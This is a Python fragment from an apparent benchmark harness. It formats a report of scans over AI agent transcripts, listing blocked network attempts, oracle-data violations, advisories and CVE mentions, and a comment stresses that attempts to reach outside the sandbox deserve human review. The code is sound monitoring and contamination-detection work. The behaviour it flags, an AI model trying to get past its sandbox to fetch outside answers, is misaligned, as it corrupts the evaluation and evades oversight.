        f"tool invocation(s) "
        f"inspected across {len(assessment['transcripts'])} transcript(s); "
        f"{assessment['tool_definitions_seen']} tool definition(s) seen and not counted as use"
        + (
            f"; {len(blocked)} attempt(s) BLOCKED before they reached the network (see below "
            f"— reported, not disqualifying on their own)"
            if blocked
            else ""
        ),
        f"  self-declared external-source records inspected: {declarations}"
        + (
            "  (none — the arm made no declaration either way, so this layer established "
            "nothing and the verdict rests entirely on the transcript scan)"
            if not declarations
            else ""
        ),
    ]
    # Printed ahead of the violations, at top volume, precisely because it must not read
    # like a footnote: intent to reach outside the sandbox is real and worth a human's eye,
    # even though — unlike everything in `violations` — no oracle data reached the arm, so
    # it does not by itself take the cell out of the comparison.
    for entry in blocked:
        lines.append(
            f"  BLOCKED   {entry['why']} — denied by the platform before it reached the "
            f"network ({entry.get('denied_by', 'denied')}); not disqualifying on its own "
            f"({Path(entry['transcript']).name}:{entry['line']})"
        )
        lines.append(f"    {entry['input'][:200]}")
    for violation in assessment["violations"]:
        lines.append(
            f"  VIOLATION {violation['why']} "
            f"({Path(violation['transcript']).name}:{violation['line']})"
        )
        lines.append(f"    {violation['input'][:200]}")
    for advisory in assessment["advisories"][:10]:
        lines.append(
            f"  advisory  {advisory['why']} "
            f"({Path(advisory['transcript']).name}:{advisory['line']})"
        )
    if assessment["cve_mentioned_in_text"]:
        lines.append(
            "  advisory  CVE id(s) mentioned in prose: "
            + ", ".join(assessment["cve_mentioned_in_text"][:6])
            + " — every bug in these corpora is ours, so no CVE can describe one"
        )
    return "\n".join(lines)
